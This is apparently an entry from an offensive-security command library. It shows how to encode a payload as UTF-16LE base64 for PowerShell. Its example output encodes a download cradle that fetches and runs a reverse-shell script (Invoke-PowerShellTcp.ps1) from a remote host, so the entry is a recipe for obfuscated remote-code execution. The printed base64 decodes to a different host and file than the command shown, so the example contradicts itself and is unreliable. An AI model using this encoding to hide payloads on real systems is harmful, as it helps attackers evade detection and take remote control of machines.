---
id: d30cf702-d601-49aa-bad5-c45911a03fc0
name: iconv Encode a String with UTF-16 and Base64
type: command
executor: bash
data: echo -n "$_PAYLOAD" | iconv -t utf-16le  | base64 -w 0
output: 'root@kali:~# echo -n "iex (New-Object Net.WebClient).downloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1'')"
  | iconv -t utf-16le | base64 -w 0

  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA='
created_at: '2019-11-13T23:32:45.203382+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# iconv Encode a String with UTF-16 and Base64

```bash
echo -n "$_PAYLOAD" | iconv -t utf-16le  | base64 -w 0
```

## Expected Output

```
root@kali:~# echo -n "iex (New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')" | iconv -t utf-16le | base64 -w 0
aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```
